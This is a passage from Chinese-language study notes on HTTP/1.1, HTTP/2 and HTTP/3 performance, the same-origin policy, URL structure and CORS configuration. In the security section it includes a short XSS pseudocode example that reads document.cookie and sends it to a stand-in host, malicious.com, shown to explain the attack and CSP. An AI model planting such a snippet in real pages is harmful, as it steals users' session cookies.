机制来解决这个问题，服务器会将数据分割成若干个数据块，每个数据块发送时会附上上个数据块的长度，最后使用一个零长度的块作为发送数据完成的标志。这样就提供了对动态内容的支持。\n客户端 Cookie（在 http1.1 中引入） 安全机制（在 http1.1 中引入） HTTP/1.1 还有哪些不足？\n文本传输效率问题而且不安全\nheader 中每次都传输类似头，增加了传输成本\nhttp/1.1 中的一个 tcp 链接同一时刻只能处理一个 http 请求，在当前的请求没有结束之前，其他的请求只能处于阻塞状态（对头阻塞问题）\nHTTP/1.1 对带宽的利用率却并不理想， 核心问题\n带宽是指每秒最大能发送或者接收的字节数。我们把每秒能发送的最大字节数称为上行带宽，每秒能够接收的最大字节数称为下行带宽。\nHTTP/1.1 很难将带宽用满。比如我们常说的 100M 带宽，实际的下载速度能达到 12.5M/S，而采用 HTTP/1.1 时，也许在加载页面资源时最大只能使用到 2.5M/S，很难将 12.5M 全部用满。\n对于队头阻塞问题，只要传输层是 TCP，就不会得到根本上的解决， http/2 利用流的的机制很大程度的缓解了这个问题，http/3 传输层换成了 UDP 才彻底解决这个问题\nHTTP/2.0 HTTP/1.1 最核心的优化有三种方式：\n增加了持久连接。 浏览器为每个域名最多同时维护 6 个 TCP 持久连接。 使用 CDN 实现域名分片机制。 域名分片:\n通过 CDN，同时为每个域名维护 6 个连接，大大减轻了整个资源的下载时间。如果使用单个 TCP 的持久连接，下载 100 个资源所花费的时间为 100 _ n _ RTT；若通过上面的技术，就可以把整个时间缩短为 100 /_ n /_ RTT/(6 * CDN 个数)。\nHTTP/1.1 的主要问题 带宽的利用率低，主要是由以下三个原因导致的。\nTCP 的慢启动。 一旦一个 TCP 连接建立之后，就进入了发送数据状态，刚开始 TCP 协议会采用一个非常慢的速度去发送数据，然后慢慢加快发送数据的速度，直到发送数据的速度达到一个理想状态，这个过程称为慢启动。\n慢启动是 TCP 为了减少网络拥塞的一种策略，是没有办法改变的。\n之所以说慢启动会带来性能问题，是因为页面中常用的一些关键资源文件本来就不大，如 HTML 文件、CSS 文件和 JavaScript 文件，通常这些文件在 TCP 连接建立好之后就要发起请求的，但这个过程是慢启动，所以耗费的时间比正常的时间要多，这样就推迟了首次渲染页面的时长。\n同时开启了多条 TCP 连接，那么这些连接会竞争固定的带宽。 系统同时建立了多条 TCP 连接，当带宽充足时，每条连接发送或者接收速度会慢慢向上增加；而一旦带宽不足时，这些 TCP 连接又会减慢发送或者接收的速度。比如一个页面有 200 个文件，使用了 3 个 CDN，那么加载该网页的时候就需要建立 6 * 3，也就是 18 个 TCP 连接来下载资源；在下载过程中，当发现带宽不足的时候，各个 TCP 连接就需要动态减慢接收数据的速度。\n这样就会出现一个问题，因为有的 TCP 连接下载的是一些关键资源，如 CSS 文件、JavaScript 文件等，而有的 TCP 连接下载的是图片、视频等普通的资源文件，但是多条 TCP 连接之间又不能协商让哪些关键资源优先下载，这样就有可能影响那些关键资源的下载速度。\nHTTP/1.1 队头阻塞的问题。 HTTP/1.1 中使用持久连接时，虽然能公用一个 TCP 管道，但是在一个管道中同一时刻只能处理一个请求，在当前的请求没有结束之前，其他的请求只能处于阻塞状态。这意味着我们不能随意在一个管道中发送请求和接收内容。\n阻塞请求的因素有很多，并且都是一些不确定性的因素，假如有的请求被阻塞了 5 秒，那么后续排队的请求都要延迟等待 5 秒，在这个等待的过程中，带宽、CPU 都被白白浪费。\n在浏览器处理生成页面的过程中，是非常希望能提前接收到数据的，这样就可以对这些数据做预处理操作，比如提前接收到了图片，那么就可以提前进行编解码操作，等到需要使用该图片的时候，就可以直接给出处理后的数据了，这样能让用户感受到整体速度的提升。\n但队头阻塞使得这些数据不能并行请求，所以队头阻塞是很不利于浏览器优化的。\n应用层对头阻塞问题，HTTP/1.1 中使用持久连接时，虽然能公用一个 TCP 管道，但是在一个管道中同一时刻只能处理一个请求，在当前的请求没有结束之前，其他的请求只能处于阻塞状态。这意味着我们不能随意在一个管道中发送请求和接收内容。\n因为阻塞请求的因素有很多，并且都是一些不确定性的因素，假如有的请求被阻塞了 5 秒，那么后续排队的请求都要延迟等待 5 秒，在这个等待的过程中，带宽、CPU 都被白白浪费了。\n在浏览器处理生成页面的过程中，是非常希望能提前接收到数据的，这样就可以对这些数据做预处理操作，比如提前接收到了图片，那么就可以提前进行编解码操作，等到需要使用该图片的时候，就可以直接给出处理后的数据了，这样能让用户感受到整体速度的提升。但队头阻塞使得这些数据不能并行请求，所以队头阻塞是很不利于浏览器优化的。\nHTTP/1.1 所存在的一些主要问题：慢启动和 TCP 连接之间相互竞争带宽是由于 TCP 本身的机制导致的，而队头阻塞是由于 HTTP/1.1 的机制导致的。\nHTTP/2 的解决办法 虽然 TCP 有问题，但是我们依然没有换掉 TCP 的能力，所以规避 TCP 的慢启动和 TCP 连接之间的竞争问题。\n多路复用 HTTP/2 的思路就是一个域名只使用一个 TCP 长连接来传输数据，这样整个页面资源的下载过程只需要一次慢启动，同时也避免了多个 TCP 连接竞争带宽所带来的问题。\n队头阻塞的问题，等待请求完成后才能去请求下一个资源，这种方式无疑是最慢的，HTTP/2 需要实现资源的并行请求，也就是任何时候都可以将请求发送给服务器，而并不需要等待其他请求的完成，然后服务器也可以随时返回处理好的请求资源给浏览器。\n多路复用机制，HTTP/2 的解决方案可以参考下图：\n**每个请求（不是数据包层面的）**都有一个对应的 ID，如 stream1 表示 index.html 的请求，stream2 表示 foo.css 的请求。这样在浏览器端，就可以随时将请求发送给服务器了。\n服务器端接收到这些请求后，会根据自己的喜好来决定优先返回哪些内容。之所以可以随意发送，是因为每份数据都有对应的 ID，浏览器接收到之后，会筛选出相同 ID 的内容，将其拼接为完整的 HTTP 响应数据。\nHTTP/2 使用了多路复用技术，可以将请求分成一帧一帧的数据去传输，这样带来了一个额外的好处，就是当收到一个优先级高的请求时，比如接收到 JavaScript 或者 CSS 关键资源的请求，服务器可以暂停之前的请求来优先处理关键资源的请求。\n多路复用的实现 HTTP/2 添加了一个二进制分帧层，HTTP/2 的请求和接收过程：\n首先，浏览器准备好请求数据，包括了请求行、请求头等信息，如果是 POST 方法，那么还要有请求体。 一条请求的这些数据经过二进制分帧层处理之后，会被转换为一个个带有请求 ID 编号的帧，通过协议栈将这些帧发送给服务器。 服务器接收到所有帧之后，会将所有相同 ID 的帧合并为一条完整的请求信息。 然后服务器处理该条请求，并将处理的响应行、响应头和响应体分别发送至二进制分帧层。 同样，二进制分帧层会将这些响应数据转换为一个个带有响应 ID 编号的帧，经过协议栈发送给浏览器。 浏览器接收到响应帧之后，会根据 ID 编号将帧的数据提交给对应的请求。 从上面的流程可以看出，通过引入二进制分帧层，就实现了 HTTP 的多路复用技术。\nHTTP/2 引入了二进制分帧层，不过 HTTP/2 的语义和 HTTP/1.1 依然是一样的，也就是说它们通信的语言并没有改变，比如开发者依然可以通过 Accept 请求头告诉服务器希望接收到什么类型的文件，依然可以使用 Cookie 来保持登录状态，依然可以使用 Cache 来缓存本地文件，这些都没有变，发生改变的只是传输方式。这一点对开发者来说尤为重要，这意味着不需要为 HTTP/2 去重建生态，并且 HTTP/2 推广起来会也相对更轻松。\nHTTP/2 其他特性 多路复用是 HTTP/2 的最核心功能，它能实现资源的并行传输。多路复用技术是建立在二进制分帧层的基础之上。其实基于二进制分帧层，HTTP/2 还附带实现了很多其他功能：\n1. 可以设置请求的优先级 浏览器中有些数据是非常重要的，但是在发送请求时，重要的请求可能会晚于那些不怎么重要的请求，如果服务器按照请求的顺序来回复数据，那么这个重要的数据就有可能推迟很久才能送达浏览器。\n为了解决这个问题，HTTP/2 提供了请求优先级，可以在发送请求时，标上该请求的优先级，这样服务器接收到请求之后，会优先处理优先级高的请求。\n2. 服务器推送 HTTP/2 还可以直接将数据提前推送到浏览器。，当用户请求一个 HTML 页面之后，服务器知道该 HTML 页面会引用几个重要的 JavaScript 文件和 CSS 文件，那么在接收到 HTML 请求之后，附带将要使用的 CSS 文件和 JavaScript 文件一并发送给浏览器，这样当浏览器解析完 HTML 文件之后，就能直接拿到需要的 CSS 文件和 JavaScript 文件，这对首次打开页面的速度起到了至关重要的作用。\n3. 头部压缩 HTTP/2 对请求头和响应头进行了压缩，在浏览器发送请求的时候，基本上都是发送 HTTP 请求头，很少有请求体的发送，通常情况下页面也有 100 个左右的资源，如果将这 100 个请求头的数据压缩为原来的 20%，那么传输效率肯定能得到大幅提升。\n虽然 HTTP/2 解决了 HTTP/1.1 中的队头阻塞问题，但是 HTTP/2 依然是基于 TCP 协议的，而 TCP 协议依然存在数据包级别的队头阻塞问题，那么你觉得 TCP 的队头阻塞是如何影响到 HTTP/2 性能的呢？\n注意：\n对头堵塞的分类有：\nHTTP 的对头堵塞\nTCP 的对头堵塞（TCP 协议存在数据包级别的队头阻塞问题）\ntcp 层对每个数据包都有编号，分为 1，2，3 \u0026hellip;. tcp 保证双向稳定可靠的传输，如果 2 包数据丢失，1 号包和 3 号包来了，那么在超时重传时间还没有收到 2 编号数据包，服务端会发送 2 号数据包，客服端收到之后，发出确认，服务端才会继续发送其他数据，客服端数据才会呈现给上层应用层，这样 tcp 层的阻塞就发生了。\n高速重发控制\nHTTP/2 协议规范于 2015 年 5 月正式发布。在 HTTP/2 出现之前，开发者需要采取很多变通的方式来解决 HTTP/1 所存在的问题，不过 HTTP/2 在 2018 年就开始得到了大规模的应用，HTTP/1 中存在的一大堆缺陷都得到了解决。\nHTTP/3 http2 的多路复用：\n一个域名下面只建立一个 TCP 持久连接 多个 http 请求都在这一个连接中发送，解决应用层队头阻塞（二进制分帧层） 能充分利用带宽 最大限度规避了 TCP 的慢启动 头部压缩 服务器推送 http2 采用多路复用技术（引入二进制分帧层），可以在一个 TCP 连接中同时发送多个 HTTP 请求。因为每个请求经过二进制分帧层后，每个请求中同一个请求拆分的数据包后会带有一个相同的 id 标识，标识相同，说明那些数据包是属于同一个请求的。数据包到达接收端后，会在接收端通过标识将多个数据包合并为一个请求，从而实现 http 请求的区分。 同时因为一个域名下只有一个 TCP 连接需要建立，所以最大限度的回避了 TCP 的慢启动问题，同时也避免了多条 TCP 连接之间的带宽竞争问题。 同时 http2.0 还支持头部压缩和服务器推送功能。\nHTTP/2 缺陷 TCP 的队头阻塞 HTTP/2 解决了应用层面的队头阻塞问题，但 HTTP/2 依然是基于 TCP 协议的，而 TCP 最初就是为了单连接而设计的。可以把 TCP 连接看成是两台计算机之间的一个虚拟管道，计算机的一端将要传输的数据按照顺序放入管道，最终数据会以相同的顺序出现在管道的另外一头。\nHTTP/1.1 协议栈中 TCP 是如何传输数据的。\n正常情况下的 TCP 传输数据过程\n从一端发送给另外一端的数据会被拆分为一个个有顺序的数据包，这些数据包通过网络传输到了接收端，接收端乱序接收到后再按照顺序将这些数据包组合成原始数据，完成数据传输。\n如果在数据包传输的过程中，有一个数据因为网络故障或者其他原因而丢包了，那么整个 TCP 的连接就会处于暂停状态，需要等待丢失的数据包被重新传输过来。可以把 TCP 连接看成是一个按照顺序传输数据的管道，管道中的任意一个数据丢失了，那之后的数据都需要等待该数据的重新传输。\nTCP 丢包状态\n在 TCP 传输过程中，由于单个数据包的丢失而造成的阻塞称为 TCP 上的队头阻塞。\n那队头阻塞是怎么影响 HTTP/2 传输的呢？首先正常情况下 HTTP/2 是怎么传输多路请求的：\n在 HTTP/2 中，多个请求是跑在一个 TCP 管道中的，如果其中任意一路数据流中出现了丢包的情况，那么就会阻塞该 TCP 连接中的所有请求。这不同于 HTTP/1.1，使用 HTTP/1.1 时，浏览器为每个域名开启了 6 个 TCP 连接，如果其中的 1 个 TCP 连接发生了队头阻塞，那么其他的 5 个连接依然可以继续传输数据。\n所以随着丢包率的增加，HTTP/2 的传输效率也会越来越差。有测试数据表明，当系统达到了 2% 的丢包率时，HTTP/1.1 的传输效率反而比 HTTP/2 表现得更好。\nTCP 建立连接的延时 TCP 的握手过程也是影响传输效率的一个重要因素，即 TCP 协议建立连接需要花费的时间。\n网络延迟又称为 RTT（Round Trip Time）：把从浏览器发送一个数据包到服务器，再从服务器返回数据包到浏览器的整个往返时间称为 RTT。RTT 是反映网络性能的一个重要指标。\n建立 TCP 连接时，需要花费多少个 RTT ？——1.5 个 RTT\nHTTP/1 和 HTTP/2 都是使用 TCP 协议来传输，HTTPS 还需要使用 TLS 协议进行安全传输。而使用 TLS 也需要一个握手过程，这样就需要有两个握手延迟过程。\n建立 TCP 连接的三次握手，也就是说需要在消耗完 1.5 个 RTT 之后才能进行数据传输。 进行 TLS 连接（版本：TLS1.2 和 TLS1.3），每个版本建立连接所花的时间不同，大致是需要 1 ～ 2 个 RTT 传输数据之前，一般需要花掉 3 ～ 4 个 RTT。如果浏览器和服务器的物理距离较近，那么 1 个 RTT 的时间可能在 10 毫秒以内，也就是说总共要消耗掉 30 ～ 40 毫秒。但如果服务器相隔较远，那么 1 个 RTT 就可能需要 100 毫秒以上，这种情况下整个握手过程需要 300 ～ 400 毫秒。\n通过改进 TCP 协议来解决 http2 中的问题非常困难。因为：\n中间设备的僵化\n互联网是由多个网络互联的网状结构，为了能够保障互联网的正常工作，我们需要在互联网的各处搭建各种设备，这些设备就被称为中间设备，这些设备包括了路由器、防火墙、NAT、交换机等。\n它们依赖的软件很少升级，而这些软件使用了大量的 TCP 特性，这些功能被设置之后就很少更新。\n所以，如果我们在客户端升级了 TCP 协议，但是当新协议的数据包经过这些中间设备时，它们可能不理解包的内容，于是这些数据就会被丢弃掉。这就是中间设备僵化，它是阻碍 TCP 更新的一大障碍。\n操作系统导致 TCP 协议僵化\nTCP 协议都是通过操作系统内核来实现的，应用程序只能使用不能修改。\n通常操作系统的更新都滞后于软件的更新，因此要想自由地更新内核中的 TCP 协议也是非常困难的。\nQUIC 协议 HTTP/2 的缺陷和 TCP 协议相关。由于 TCP 协议僵化，几乎不可能通过修改 TCP 协议自身来解决这些问题，那么解决问题的思路是绕过 TCP 协议，发明一个 TCP 和 UDP 之外的新的传输协议。这也面临着和修改 TCP 一样的挑战，因为中间设备的僵化，这些设备只认 TCP 和 UDP，如果采用了新的协议，新协议在这些设备同样不被很好地支持。\nHTTP/3 选择了一个折衷的方法——UDP 协议，基于 UDP 实现了类似于 TCP 的多路数据流、传输可靠性等功能，把这套功能称为QUIC 协议。\nQUIC 协议集合了以下几点功能：\n实现了类似 TCP 的流量控制、传输可靠性的功能。虽然 UDP 不提供可靠性的传输，但 QUIC 在 UDP 的基础之上增加了一层来保证数据可靠性传输。它提供了数据包重传、拥塞控制以及其他一些 TCP 中存在的特性。 集成了 TLS 加密功能。目前 QUIC 使用的是 TLS1.3，相较于早期版本 TLS1.3 有更多的优点，其中最重要的一点是减少了握手所花费的 RTT 个数。 实现了 HTTP/2 中的多路复用功能。和 TCP 不同，QUIC 实现了在同一物理连接上可以有多个独立的逻辑数据流（如下图）。实现了数据流的单独传输，就解决了 TCP 中队头阻塞的问题。 实现了快速握手功能。由于 QUIC 是基于 UDP 的，所以 QUIC 可以实现使用 0-RTT 或者 1-RTT 来建立连接，这意味着 QUIC 可以用最快的速度来发送和接收数据，这样可以大大提升首次打开页面的速度。 将 HTTP/3 应用到实际环境中的挑战：\n从目前的情况来看，服务器和浏览器端都没有对 HTTP/3 提供比较完整的支持。 部署 HTTP/3 也存在着非常大的问题。因为系统内核对 UDP 的优化远远没有达到 TCP 的优化程度。 中间设备僵化的问题。这些设备对 UDP 的优化程度远远低于 TCP，据统计使用 QUIC 协议时，大约有 3%～ 7% 的丢包率。 HTTP/3 正是基于 QUIC 协议的，你可以把 QUIC 看成是集成了“TCP+HTTP/2 的多路复用 +TLS 等功能”的一套协议。这是集众家所长的一个协议，从协议最底层对 Web 的文件传输做了比较彻底的优化，所以等生态相对成熟时，可以用来打造比现在的 HTTP/2 还更加高效的网络。\n虽说这套协议解决了 HTTP/2 中因 TCP 而带来的问题，不过由于是改动了底层协议，所以推广起来还会面临着巨大的挑战。\n从标准制定到实践再到协议优化还需要走很长一段路； 因为动了底层协议，所以 HTTP/3 的增长会比较缓慢，这和 HTTP/2 有着本质的区别。 Web 页面安全 如果没有页面中的安全策略，Web 会是开放的，任何资源都可以接入其中任何一个页面，我们的网站可以加载并执行别人网站的脚本文件、图片、音频 / 视频等资源，甚至可以下载其他站点的可执行文件。\nWeb 世界是开放的，这很符合 Web 理念。但如果 Web 世界是绝对自由的，页面行为没有任何限制，这会造成无序，出现很多不可控的问题。\n比如打开了一个银行站点，然后又一不小心打开了一个恶意站点，如果没有安全措施，恶意站点就可以做很多事情：\n修改银行站点的 DOM、CSSOM 等信息； 在银行站点内部插入 JavaScript 脚本； 劫持用户登录的用户名和密码； 读取银行站点的 Cookie、IndexDB 等数据； 甚至还可以将这些信息上传至自己的服务器，这样就可以在你不知情的情况下伪造一些转账请求等信息。 页面中最基础、最核心的安全策略：同源策略（Same-origin policy）\n同源策略 为什么 XMLHttpRequest 不能跨域请求资源？\n什么是同源？\n同源：URL 的协议、域名和端口都相同 。\n浏览器默认两个相同的源之间是可以相互访问资源和操作 DOM 的。两个不同的源之间若想要相互访问资源或者操作 DOM，就会有一套基础的安全策略的制约，称为同源策略。\n同源策略主要表现在 DOM、Web 数据和网络这三个层面。\nDOM 层面。同源策略限制了来自不同源的 JavaScript 脚本对当前源页面的 DOM 对象读和写的操作。\n从官网中打开另外一个专栏页面，如下图所示：\n第一个页面和第二个页面是同源关系，所以可以在第二个页面中操作第一个页面的 DOM，比如将第一个页面全部隐藏掉，代码如下所示：\n1 2 3 4 5 { let pdom = opener.document; pdom.body.style.display = \u0026#34;none\u0026#34;; } // 对象 opener 就是指向第一个页面的 window 对象，可以通过操作 opener 来控制第一个页面中的 DOM。 在第二个页面的控制台中执行上面那段代码，就成功地操作了第一个页面中的 DOM，将页面隐藏了，如下图： ​ 如果打开的第二个页面和第一个页面不是同源的，那么它们就无法相互操作 DOM。\n1 Blocked a frame with origin \u0026#34;https://www.infoq.cn\u0026#34; from accessing a cross-origin frame. 数据层面。同源策略限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。由于同源策略，我们依然无法通过第二个页面的 opener 来访问第一个页面中的 Cookie、IndexDB 或者 LocalStorage 等内容。\n网络层面。同源策略限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。\n浏览器出让了同源策略的哪些安全性\n安全性和便利性是相互对立的，让不同的源之间绝对隔离，无疑是最安全的措施，但这 也会使得 Web 项目难以开发和使用。因此就要在这之间做出权衡，出让一些安全性来满足灵活性；而出让安全性又带来了很多安全问题，最典型的是 XSS 攻击和 CSRF 攻击。\n页面中可以嵌入第三方资源，同源策略要让一个页面的所有资源都来自于同一个源，也就是要将该页面的所有 HTML 文件、JavaScript 文件、CSS 文件、图片等资源都部署在同一台服务器上，这带来了诸多限制。比如将不同的资源部署到不同的 CDN 上时，CDN 上的资源就部署在另外一个域名上，因此就需要同源策略对页面的引用资源开一个“口子”，让其任意引用外部文件。\n最初的浏览器都是支持外部引用资源文件的，不过这也带来了很多问题。之前在开发浏览器的时候，遇到最多的一个问题是浏览器的首页内容会被一些恶意程序劫持，劫持的途径很多，其中最常见的是恶意程序通过各种途径往 HTML 文件中插入恶意脚本。比如，恶意程序在 HTML 文件内容中插入如下一段 JavaScript 代码： 当这段 HTML 文件的数据被送达浏览器时，浏览器是无法区分被插入的文件是恶意的还是正常的，这样恶意脚本就寄生在页面之中，当页面启动时，它可以修改用户的搜索结果、改变一些内容的连接指向，等等。\n除此之外，它还能将页面的的敏感数据，如 Cookie、IndexDB、LoacalStorage 等数据通过 XSS 的手段发送给服务器。具体来讲就是，当你不小心点击了页面中的一个恶意链接时，恶意 JavaScript 代码可以读取页面数据并将其发送给服务器，如下面这段伪代码：\n1 2 3 4 5 function onClick() { let url = `http://malicious.com?cookie = ${document.cookie}`; open(url); } onClick(); 在这段代码中，恶意脚本读取 Cookie 数据，并将其作为参数添加至恶意站点尾部，当打开该恶意页面时，恶意服务器就能接收到当前用户的 Cookie 信息。\n以上就是一个非常典型的 XSS 攻击。为了解决 XSS 攻击，浏览器中引入了内容安全策略，称为 CSP。CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。通过这些手段就可以大大减少 XSS 攻击。\n跨域资源共享和跨文档消息机制\n默认情况下，通过 XMLHttpRequest 或者 Fetch 来请求非同源地址中的资源，这时同源策略会阻止其向非同源地址发出请求，这样会大大制约我们的生产力。\n为了解决这个问题，引入了跨域资源共享（CORS），使用该机制可以进行跨域访问控制，从而使跨域数据传输得以安全进行。\n如果两个页面不是同源的，则无法相互操纵 DOM。不过在实际应用中，经常需要两个不同源的 DOM 之间进行通信，于是浏览器中又引入了跨文档消息机制，可以通过 window.postMessage 的 JavaScript 接口来和不同源的 DOM 进行通信。\n扩展 URL 一个完整的 URL（统一资源定位符，Uniform Resource Locator）通常由多个部分组成，每个部分都有特定的用途和意义。URL 用于定位网络资源，如网页、图像、视频等。下面是一个典型的 URL 的结构以及各部分的详细解释：\nURL 的基本结构\n一个典型的 URL 结构如下：\n1 scheme://username:password@subdomain.domain.tld:port/path?query_string#fragment_id URL 的各部分组成\n协议（Scheme） 也称为“模式”或“方案”，是 URL 的第一部分，用于指定访问资源所使用的协议。 例如：http, https, ftp, mailto, file 等。 示例：https:// 指的是使用 HTTP 安全协议。 用户名和密码（Username）（可选），现在几乎看不到这部分了。 可选部分，通常用于需要认证的情况下指定用户名和密码。 格式为 username:password@。 示例：user:pass@ 表示用户名为 user，密码为 pass。 注意：现代浏览器通常不鼓励或阻止在 URL 中使用用户名和密码。 子域名（Subdomain） 定义：是域名的一个可选部分，用于进一步划分主域名。 示例：www、api、blog 等是常见的子域名。 完整示例：在 https://www.example.com 中，www 是子域名。 域名（Domain Name） 定义：是指主域名部分，通常包含两个部分：顶级域名（TLD, Top-Level Domain） 和 二级域名（或主域名）。 示例： example.com 中： 二级域名（或主域名）：example 顶级域名（TLD）：com 端口（Port）（可选） 指定服务器上运行的应用程序监听的网络端口。HTTP 的默认端口是 80，HTTPS 的默认端口是 443。 端口号可选，如果省略则使用默认端口。 示例：https://example.com:8080 中的 8080 表示端口号。 路径（Path） 资源在服务器上的具体位置，通常类似于文件系统中的路径。 示例：/articles/index.html，表示服务器上 articles 文件夹中的 index.html 文件。 如果省略，通常默认使用 /，表示服务器的根目录。 查询字符串（Query String）（可选） 由一个问号 ? 开始，后面跟着 键=值 对，用于向服务器传递额外的参数。 可以包含多个参数，用 \u0026amp; 连接。 示例：?id=123\u0026amp;lang=en，表示 id 参数值为 123，lang 参数值为 en。 片段标识符（Fragment Identifier）（可选） 由井号 # 开头，用于指定资源的一个子部分（例如页面内的锚点）。 示例：#section2，表示跳转到页面的 section2 部分。 域名的具体部分\n这里再对域名部分进行详细解释：\n根域名 (Root Domain)：通常是一个全局顶级域名（com、org、net 等），它由域名系统（DNS）维护和管理。 顶级域名 (TLD, Top-Level Domain)：位于域名的最右边部分，用于标识组织类型（如 com、edu、gov）或国家代码（如 cn、uk）。 二级域名 (Second-Level Domain)：通常是具体的网站名称或组织名称，用于识别具体的品牌或组织，例如 example。 子域名 (Subdomain)：在主域名前面添加的前缀，用于将网站划分为不同的部分或服务，例如 www、api、blog 等。 同源 要判断是否为跨域，需要了解同源策略的定义。同源策略要求，网页请求的资源必须来源于相同的源，否则会被视为跨域请求。\n什么是同源？\n同源指的是两个 URL 具有相同的：\n协议（Protocol）：如 http: 或 https: 主机名（Host）：如 example.com 端口号（Port）：如 80、443 等 只有在这三个部分完全相同时，两个 URL 才被视为同源。\n跨域的判断标准\n如果任何一个上述三要素不同，那么浏览器会认为两个 URL 来自不同的源，即跨域。\n二级域名和三级域名是否算跨域？\n当协议、主机名和端口号三者之中任何一个不同时，浏览器会判定为跨域。因此，即使协议和端口相同，但主机名不同，也会被视为跨域。 对于二级域名和三级域名，因为主机名部分不同（尽管它们共享相同的根域名），也会被判定为跨域。 示例分析\n以下是一些例子，帮助理解不同域名、协议和端口是否构成跨域：\n不同二级域名（跨域） https://sub1.example.com https://sub2.example.com 这两个 URL 是跨域的，因为它们的二级域名（sub1 和 sub2）不同，虽然协议、根域名和端口相同。\n不同三级域名（跨域） https://app1.sub.example.com https://app2.sub.example.com 这两个 URL 也是跨域的，因为它们的三级域名（app1 和 app2）不同，尽管协议、二级域名和端口相同。\n同域名不同协议（跨域） https://example.com http://example.com 这两个 URL 是跨域的，因为协议（https 和 http）不同。\n同域名不同端口（跨域） https://example.com:443 https://example.com:8443 这两个 URL 是跨域的，因为端口（443 和 8443）不同。\n完全相同的源（非跨域） https://example.com https://example.com 这两个 URL 是非跨域的，因为协议、主机名、端口完全相同。\n总结\n跨域是指协议、主机名或端口中的任何一个不同。 二级域名或三级域名不同，即使根域名相同，也会被视为跨域。 CORS 跨域资源共享（Cross-Origin Resource Sharing, CORS） 是一种浏览器机制，它允许一个页面从不同源（域名、协议、端口）加载资源或数据。**CORS 通过设置 HTTP 头来决定是否允许跨域请求，从而实现跨域资源共享。**该机制在保护用户数据安全的同时，提供了灵活性，让前端应用能与不同域名的后端 API 进行通信。\n什么是 CORS？\n同源策略： 同源策略是一种安全机制，用于防止一个域的 JavaScript 在未经授权的情况下，访问另一个域的内容。简单来说，同源策略要求，浏览器中加载的脚本只能访问与其相同源（同域、同协议、同端口）下的资源。 同源策略限制了很多合法的跨域请求场景，例如前端应用与不同域名的 API 进行通信。因此，为了实现跨域资源共享，需要引入 CORS。 跨域资源共享 (CORS)： CORS 是一种解决跨域问题的标准，它允许服务器通过 HTTP 响应头来声明哪些来源的请求是被允许的。 CORS 让浏览器发送带有额外验证信息的请求，如果服务器同意这些请求，则浏览器可以访问跨域资源。 CORS 的作用\nCORS 主要用于以下场景：\n跨域请求访问：允许前端应用（如 AJAX、Fetch）跨域请求后端 API，获取数据或提交数据。 增强安全性：通过设置响应头，服务器可以严格控制哪些来源的请求被允许，从而防止跨站点请求伪造 (CSRF) 和其他安全威胁。 提升灵活性：支持现代的单页应用（SPA）与后端 API 服务之间的跨域通信。 CORS 的实现原理\nCORS 是通过服务器返回的 HTTP 响应头来控制跨域请求的行为。CORS 的工作流程通常分为以下两种类型：\n简单请求 (Simple Request)：\n这类请求满足以下三个条件： 使用的方法是 GET、POST 或 HEAD。 请求的 HTTP 头部字段不超过以下字段：Accept, Accept-Language, Content-Language, Content-Type（Content-Type 值必须是 application/x-www-form-urlencoded, multipart/form-data, text/plain）。 请求不使用自定义头部字段。 对于简单请求，浏览器会自动在请求头中加入 Origin 字段，表示请求的源。 服务器接收到请求后，通过设置响应头 Access-Control-Allow-Origin 来决定是否允许请求。 示例：\n1 2 3 4 5 6 7 GET /api/data HTTP/1.1 Host: api.example.com Origin: http://example.com HTTP/1.1 200 OK Access-Control-Allow-Origin: http://example.com Content-Type: application/json 预检请求 (Preflight Request)：\n当请求不满足简单请求的条件时（例如使用了自定义 HTTP 头、非简单方法如 PUT、DELETE 等），浏览器会在正式请求前发送一个预检请求（OPTIONS 请求），以确定服务器是否允许实际请求。 服务器通过响应预检请求来指明哪些请求方法和头部是被允许的。 示例：\n预检请求： 1 2 3 4 5 6 7 8 9 OPTIONS /api/data HTTP/1.1 Host: api.example.com Origin: http://example.com Access-Control-Request-Method: PUT HTTP/1.1 204 No Content Access-Control-Allow-Origin: http://example.com Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: Content-Type 实际请求： 1 2 3 4 5 6 7 8 httpCopy codePUT /api/data HTTP/1.1 Host: api.example.com Origin: http://example.com Content-Type: application/json HTTP/1.1 200 OK Access-Control-Allow-Origin: http://example.com Content-Type: application/json 常用的 CORS 响应头\nAccess-Control-Allow-Origin：指定哪些域名可以访问资源。如果允许所有域，可以设置为 \u0026quot;*\u0026quot;，但不推荐。 Access-Control-Allow-Methods：指定允许的 HTTP 方法，如 GET、POST、PUT 等。 Access-Control-Allow-Headers：指定允许的 HTTP 请求头部字段。 Access-Control-Allow-Credentials：指定是否允许发送 Cookie 等凭证信息。设置为 true 时允许。 Access-Control-Expose-Headers：指定哪些头部字段可以作为响应的一部分被 JavaScript 访问。 Access-Control-Max-Age：指定预检请求的响应可以被缓存的时间（以秒为单位）。 CORS 的实现\n要在服务器端实现 CORS，通常需要配置服务器以正确处理 HTTP 请求头和响应头。以下是常见的服务器端实现方式：\n1**. Node.js (Express) 示例**\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 const express = require(\u0026#34;express\u0026#34;); const app = express(); // CORS 配置中间件 app.use((req, res, next) =\u0026gt; { res.header(\u0026#34;Access-Control-Allow-Origin\u0026#34;, \u0026#34;http://example.com\u0026#34;); // 允许的来源 res.header(\u0026#34;Access-Control-Allow-Methods\u0026#34;, \u0026#34;GET, POST, PUT, DELETE\u0026#34;); // 允许的 HTTP 方法 res.header(\u0026#34;Access-Control-Allow-Headers\u0026#34;, \u0026#34;Content-Type\u0026#34;); // 允许的头部字段 res.header(\u0026#34;Access-Control-Allow-Credentials\u0026#34;, \u0026#34;true\u0026#34;); // 允许携带凭证（如 Cookies） next(); }); app.get(\u0026#34;/api/data\u0026#34;, (req, res) =\u0026gt; { res.json({ message: \u0026#34;This is a CORS-enabled response!\u0026#34; }); }); app.listen(3000, () =\u0026gt; { console.log(\u0026#34;Server running on port 3000\u0026#34;); }); Apache 服务器 在 Apache 服务器的配置文件 (httpd.conf) 或虚拟主机配置文件中添加以下内容：\n1 2 3 4 5 6 \u0026lt;IfModule mod_headers.c\u0026gt; Header set Access-Control-Allow-Origin \u0026#34;http://example.com\u0026#34; Header set Access-Control-Allow-Methods \u0026#34;GET, POST, PUT, DELETE\u0026#34; Header set Access-Control-Allow-Headers \u0026#34;Content-Type\u0026#34; Header set Access-Control-Allow-Credentials \u0026#34;true\u0026#34; 